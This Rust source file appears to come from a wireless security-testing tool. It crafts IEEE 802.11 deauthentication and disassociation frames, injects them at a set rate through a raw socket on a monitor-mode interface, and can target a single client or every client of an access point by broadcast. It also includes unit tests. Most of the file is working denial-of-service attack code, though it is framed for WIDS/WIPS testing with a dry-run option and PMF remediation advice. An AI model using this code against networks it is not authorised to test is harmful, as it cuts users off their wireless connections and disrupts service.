//! 802.11 Deauthentication and Disassociation frame crafting and injection.
//!
//! Implements pure-Rust construction of IEEE 802.11 deauthentication and
//! disassociation management frames with radiotap headers for injection via
//! raw sockets.
//!
//! # Frame Structure
//!
//! An 802.11 deauthentication frame consists of:
//! - Radiotap header (for injection through monitor-mode interfaces)
//! - 802.11 management frame header (FC, duration, addresses, sequence control)
//! - Reason code (2 bytes)

use std::time::Duration;

use anyhow::{Context, Result};
#[cfg(target_os = "linux")]
use tracing::{debug, info, warn};
#[cfg(not(target_os = "linux"))]
use tracing::info;

use super::super::{ActiveAttackConfig, ActiveWirelessAttackResult, ActiveWirelessFinding};
use crate::types::Severity;

/// IEEE 802.11 Reason Code values for deauthentication/disassociation.
pub mod reason_codes {
    /// Unspecified reason
    pub const UNSPECIFIED: u16 = 1;
    /// Previous authentication no longer valid
    pub const AUTH_INVALID: u16 = 2;
    /// Deauthenticated because sending STA is leaving (or has left) IBSS or ESS
    pub const STA_LEAVING: u16 = 3;
    /// Inactivity
    pub const INACTIVITY: u16 = 4;
    /// AP unable to handle all associated STAs
    pub const AP_BUSY: u16 = 5;
    /// Class 2 frame received from nonauthenticated STA
    pub const CLASS2_FROM_UNAUTH: u16 = 6;
    /// Class 3 frame received from nonassociated STA
    pub const CLASS3_FROM_UNASSOC: u16 = 7;
    /// Disassociated because sending STA is leaving (or has left) BSS
    pub const BSS_LEAVING: u16 = 8;
    /// STA requesting (re)association is not authenticated
    pub const STA_NOT_AUTH: u16 = 9;
}

/// Build a radiotap + 802.11 deauthentication frame.
///
/// Returns the raw bytes ready for injection on a monitor-mode interface.
///
/// # Arguments
/// * `bssid` - Target AP MAC address (6 bytes)
/// * `client` - Target client MAC address (6 bytes), or `None` for broadcast deauth
/// * `reason_code` - IEEE 802.11 reason code
pub fn build_deauth_frame(bssid: &[u8; 6], client: Option<&[u8; 6]>, reason_code: u16) -> Vec<u8> {
    let dest_addr = match client {
        Some(c) => *c,
        None => [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], // Broadcast
    };

    // Radiotap header (8 bytes, minimal)
    let radiotap_header: [u8; 8] = [
        0x00, // Version
        0x08, // Header length (8 bytes, minimal)
        0x00, // Pad to 4-byte boundary
        0x00, // Pad
        0x00, 0x00, 0x00, 0x00, // Present flags (none)
    ];

    // 802.11 Management Frame Control: subtype=12 (Deauth), type=0, proto=0
    // FC = 0b 1100 0000 0000 0000 = 0xC000
    let fc: u16 = 0xC000;
    let duration: u16 = 0;
    let seq_ctrl: u16 = 0;

    let mut frame = Vec::with_capacity(radiotap_header.len() + 24 + 2);
    frame.extend_from_slice(&radiotap_header);
    frame.extend_from_slice(&fc.to_le_bytes());
    frame.extend_from_slice(&duration.to_le_bytes());
    frame.extend_from_slice(&dest_addr);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(&seq_ctrl.to_le_bytes());
    frame.extend_from_slice(&reason_code.to_le_bytes());

    frame
}

/// Build a radiotap + 802.11 disassociation frame.
///
/// Same structure as deauth but with subtype 10 instead of 12.
pub fn build_disassoc_frame(
    bssid: &[u8; 6],
    client: Option<&[u8; 6]>,
    reason_code: u16,
) -> Vec<u8> {
    let dest_addr = match client {
        Some(c) => *c,
        None => [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
    };

    let radiotap_header: [u8; 8] = [0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];

    // Disassociation: subtype=10, type=0, proto=0
    // FC = 0b 1010 0000 0000 0000 = 0xA000
    let fc: u16 = 0xA000;
    let duration: u16 = 0;
    let seq_ctrl: u16 = 0;

    let mut frame = Vec::with_capacity(radiotap_header.len() + 24 + 2);
    frame.extend_from_slice(&radiotap_header);
    frame.extend_from_slice(&fc.to_le_bytes());
    frame.extend_from_slice(&duration.to_le_bytes());
    frame.extend_from_slice(&dest_addr);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(&seq_ctrl.to_le_bytes());
    frame.extend_from_slice(&reason_code.to_le_bytes());

    frame
}

/// Inject raw frames on a monitor-mode interface via a raw socket.
///
/// Uses AF_PACKET/SOCK_RAW with ETH_P_ALL for frame injection on Linux.
/// Rate-limited to prevent overwhelming the interface.
///
/// Returns the number of frames successfully sent.
pub async fn inject_frames(
    interface: &str,
    frames: &[Vec<u8>],
    frames_per_second: u64,
) -> Result<u64> {
    let frame_count = frames.len() as u64;
    let interval = if frames_per_second > 0 {
        Duration::from_millis(1000 / frames_per_second)
    } else {
        Duration::from_millis(100)
    };

    info!(
        interface = %interface,
        frame_count = frame_count,
        fps = frames_per_second,
        interval_ms = interval.as_millis() as u64,
        "Starting frame injection"
    );

    #[cfg(target_os = "linux")]
    {
        use std::os::unix::io::RawFd;

        extern "C" {
            fn socket(domain: i32, type_: i32, protocol: i32) -> RawFd;
            fn close(fd: RawFd) -> i32;
            fn sendto(
                fd: RawFd,
                buf: *const u8,
                len: usize,
                flags: i32,
                dest_addr: *const u8,
                addrlen: u32,
            ) -> isize;
            fn if_nametoindex(name: *const i8) -> u32;
        }

        let c_iface =
            std::ffi::CString::new(interface).context("Invalid interface name")?;

        let ifindex = unsafe { if_nametoindex(c_iface.as_ptr()) };
        if ifindex == 0 {
            anyhow::bail!("Interface '{}' not found", interface);
        }

        // AF_PACKET=17, SOCK_RAW=3, ETH_P_ALL=0x0003
        let fd = unsafe { socket(17, 3, 0x0003) };
        if fd < 0 {
            anyhow::bail!(
                "Failed to open raw socket on {}. Requires root/CAP_NET_ADMIN.",
                interface
            );
        }

        // sockaddr_ll structure for AF_PACKET
        let mut sockaddr_ll = [0u8; 20];
        sockaddr_ll[0..2].copy_from_slice(&17u16.to_le_bytes());
        sockaddr_ll[2..4].copy_from_slice(&0u16.to_le_bytes());
        sockaddr_ll[4..8].copy_from_slice(&ifindex.to_le_bytes());
        sockaddr_ll[8..10].copy_from_slice(&0u16.to_le_bytes());
        sockaddr_ll[10] = 0;
        sockaddr_ll[11] = 8;
        if let Some(first_frame) = frames.first() {
            if first_frame.len() >= 22 {
                sockaddr_ll[12..20].copy_from_slice(&first_frame[16..22]);
            }
        }

        let mut sent: u64 = 0;
        let mut interval = tokio::time::interval(interval);
        let mut frame_idx = 0;

        for frame in frames {
            interval.tick().await;
            let result = unsafe {
                sendto(
                    fd,
                    frame.as_ptr(),
                    frame.len(),
                    0,
                    sockaddr_ll.as_ptr(),
                    sockaddr_ll.len() as u32,
                )
            };
            if result >= 0 {
                sent += 1;
                debug!(frame_idx = frame_idx, bytes_sent = result, "Frame injected");
            } else {
                warn!(
                    frame_idx = frame_idx,
                    error = %std::io::Error::last_os_error(),
                    "Frame injection failed"
                );
            }
            frame_idx += 1;
        }

        unsafe { close(fd) };

        info!(sent = sent, total = frame_count, "Frame injection complete");
        Ok(sent)
    }

    #[cfg(not(target_os = "linux"))]
    {
        let _ = (interface, frames, frames_per_second);
        anyhow::bail!(
            "Frame injection is only supported on Linux. \
             Use --dry-run to preview frames without injection."
        );
    }
}

/// Run a deauthentication attack.
///
/// Crafts and optionally injects deauthentication frames targeting a specific
/// BSSID and optionally a specific client.
pub async fn run_deauth(
    config: &ActiveAttackConfig,
    broadcast: bool,
) -> Result<ActiveWirelessAttackResult> {
    let bssid = config
        .bssid
        .context("BSSID is required for deauth attack")?;

    let target_client = if broadcast { None } else { config.client };

    let client_label = match target_client {
        Some(c) => ActiveAttackConfig::format_mac(&c),
        None => "broadcast".to_string(),
    };

    info!(
        bssid = %ActiveAttackConfig::format_mac(&bssid),
        client = %client_label,
        max_frames = config.max_frames,
        dry_run = config.dry_run,
        reason_code = config.reason_code,
        "Preparing deauth attack"
    );

    let frame = build_deauth_frame(&bssid, target_client.as_ref(), config.reason_code);
    let frames: Vec<Vec<u8>> = (0..config.max_frames).map(|_| frame.clone()).collect();

    let frames_sent = if config.dry_run {
        info!(
            frame_size = frame.len(),
            frame_count = config.max_frames,
            "Dry run: frames would be sent"
        );
        config.max_frames
    } else {
        inject_frames(&config.interface, &frames, config.frames_per_second).await?
    };

    let mut findings = Vec::new();
    let mut recommendations = Vec::new();

    findings.push(ActiveWirelessFinding {
        attack_type: "deauth".to_string(),
        severity: Severity::High,
        description: format!(
            "Deauthentication {} sent to BSSID {} (client: {}, reason: {})",
            if config.dry_run {
                "frames prepared"
            } else {
                "frames transmitted"
            },
            ActiveAttackConfig::format_mac(&bssid),
            client_label,
            config.reason_code,
        ),
        evidence: format!(
            "Sent {} deauth frames to BSSID {} targeting {} (reason code: {})",
            frames_sent,
            ActiveAttackConfig::format_mac(&bssid),
            client_label,
            config.reason_code,
        ),
        remediation: "Verify WIDS/WIPS logged the deauthentication event. \
                       Check client reconnection behavior and latency. \
                       Consider enabling 802.11w (PMF) on the AP to mitigate deauth attacks."
            .to_string(),
    });

    if broadcast {
        recommendations.push(
            "Broadcast deauth targets all clients on the AP. \
             This is useful for testing AP resilience and WIPS flood detection."
                .to_string(),
        );
    }
    recommendations.push(
        "Monitor WIDS/WIPS for detection latency and alerting accuracy.".to_string(),
    );
    recommendations.push(
        "Verify all legitimate clients reconnected within acceptable time.".to_string(),
    );
    if config.dry_run {
        recommendations.push(
            "This was a dry run. No frames were transmitted. \
             Remove --dry-run to execute the actual attack."
                .to_string(),
        );
    }

    let duration_secs = if config.frames_per_second > 0 {
        config.max_frames / config.frames_per_second
    } else {
        config.max_frames / 10
    };

    Ok(ActiveWirelessAttackResult {
        interface: config.interface.clone(),
        attack_type: "deauth".to_string(),
        target_bssid: Some(ActiveAttackConfig::format_mac(&bssid)),
        target_client: Some(client_label),
        frames_sent,
        duration_secs,
        dry_run: config.dry_run,
        findings,
        raw_output: None,
        recommendations,
    })
}

/// Run a disassociation attack.
///
/// Similar to deauth but sends disassociation frames which are often less
/// likely to be blocked by client-side protections.
pub async fn run_disassoc(
    config: &ActiveAttackConfig,
    broadcast: bool,
) -> Result<ActiveWirelessAttackResult> {
    let bssid = config
        .bssid
        .context("BSSID is required for disassoc attack")?;

    let target_client = if broadcast { None } else { config.client };

    let client_label = match target_client {
        Some(c) => ActiveAttackConfig::format_mac(&c),
        None => "broadcast".to_string(),
    };

    info!(
        bssid = %ActiveAttackConfig::format_mac(&bssid),
        client = %client_label,
        max_frames = config.max_frames,
        dry_run = config.dry_run,
        "Preparing disassoc attack"
    );

    let frame = build_disassoc_frame(&bssid, target_client.as_ref(), config.reason_code);
    let frames: Vec<Vec<u8>> = (0..config.max_frames).map(|_| frame.clone()).collect();

    let frames_sent = if config.dry_run {
        info!(
            frame_size = frame.len(),
            frame_count = config.max_frames,
            "Dry run: disassoc frames would be sent"
        );
        config.max_frames
    } else {
        inject_frames(&config.interface, &frames, config.frames_per_second).await?
    };

    let mut findings = Vec::new();
    let mut recommendations = Vec::new();

    findings.push(ActiveWirelessFinding {
        attack_type: "disassoc".to_string(),
        severity: Severity::High,
        description: format!(
            "Disassociation {} sent to BSSID {} (client: {}, reason: {})",
            if config.dry_run {
                "frames prepared"
            } else {
                "frames transmitted"
            },
            ActiveAttackConfig::format_mac(&bssid),
            client_label,
            config.reason_code,
        ),
        evidence: format!(
            "Sent {} disassoc frames to BSSID {} targeting {} (reason code: {})",
            frames_sent,
            ActiveAttackConfig::format_mac(&bssid),
            client_label,
            config.reason_code,
        ),
        remediation: "Verify WIDS/WIPS logged the disassociation event. \
                       Check client reconnection behavior. \
                       Consider enabling 802.11w (PMF) on the AP."
            .to_string(),
    });

    recommendations.push(
        "Disassoc frames may bypass some client-side deauth protections.".to_string(),
    );
    recommendations.push("Monitor WIDS/WIPS for detection accuracy.".to_string());
    if config.dry_run {
        recommendations.push("This was a dry run. No frames were transmitted.".to_string());
    }

    let duration_secs = if config.frames_per_second > 0 {
        config.max_frames / config.frames_per_second
    } else {
        config.max_frames / 10
    };

    Ok(ActiveWirelessAttackResult {
        interface: config.interface.clone(),
        attack_type: "disassoc".to_string(),
        target_bssid: Some(ActiveAttackConfig::format_mac(&bssid)),
        target_client: Some(client_label),
        frames_sent,
        duration_secs,
        dry_run: config.dry_run,
        findings,
        raw_output: None,
        recommendations,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_deauth_frame_length() {
        let frame =
            build_deauth_frame(&[0xAA; 6], Some(&[0xBB; 6]), reason_codes::STA_LEAVING);
        // Radiotap(8) + FC(2) + Duration(2) + Addr1(6) + Addr2(6) + Addr3(6) + SeqCtrl(2) + Reason(2) = 34
        assert_eq!(frame.len(), 34);
    }

    #[test]
    fn test_deauth_frame_broadcast() {
        let frame =
            build_deauth_frame(&[0xAA; 6], None, reason_codes::UNSPECIFIED);
        // Radiotap(8) + FC(2) + Duration(2) + addr1(6) + addr2(6) + addr3(6) + SeqCtrl(2) + Reason(2)
        // addr1 (dest/broadcast) at offset 12
        assert_eq!(
            &frame[12..18],
            &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]
        );
        // addr2 (src/BSSID) at offset 18
        assert_eq!(
            &frame[18..24],
            &[0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA]
        );
    }

    #[test]
    fn test_deauth_frame_targeted() {
        let client = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66];
        let bssid = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let frame = build_deauth_frame(&bssid, Some(&client), reason_codes::STA_LEAVING);
        // addr1 (dest = client) at offset 12
        assert_eq!(&frame[12..18], &[0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        // addr2 (src = BSSID) at offset 18
        assert_eq!(&frame[18..24], &bssid);
        // addr3 (BSSID) at offset 24
        assert_eq!(&frame[24..30], &bssid);
    }

    #[test]
    fn test_deauth_frame_control_field() {
        let frame = build_deauth_frame(&[0xAA; 6], None, 0);
        // FC = 0xC000 (deauth) in little-endian
        assert_eq!(frame[8], 0x00);
        assert_eq!(frame[9], 0xC0);
    }

    #[test]
    fn test_disassoc_frame_control_field() {
        let frame = build_disassoc_frame(&[0xAA; 6], None, 0);
        // FC = 0xA000 (disassoc) in little-endian
        assert_eq!(frame[8], 0x00);
        assert_eq!(frame[9], 0xA0);
    }

    #[test]
    fn test_disassoc_frame_length() {
        let frame =
            build_disassoc_frame(&[0xAA; 6], None, reason_codes::BSS_LEAVING);
        assert_eq!(frame.len(), 34);
    }

    #[test]
    fn test_reason_code_in_frame() {
        let reason = reason_codes::AUTH_INVALID;
        let frame = build_deauth_frame(&[0xAA; 6], None, reason);
        let reason_in_frame = u16::from_le_bytes([frame[32], frame[33]]);
        assert_eq!(reason_in_frame, reason);
    }

    #[test]
    fn test_radiotap_header() {
        let frame = build_deauth_frame(&[0xAA; 6], None, 0);
        assert_eq!(frame[0], 0x00); // Version
        assert_eq!(frame[1], 0x08); // Header length
    }

    #[test]
    fn test_build_multiple_frames() {
        let bssid = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let frames: Vec<Vec<u8>> = (0..10)
            .map(|_| build_deauth_frame(&bssid, None, reason_codes::UNSPECIFIED))
            .collect();
        assert_eq!(frames.len(), 10);
        assert!(frames.windows(2).all(|w| w[0] == w[1]));
    }
}
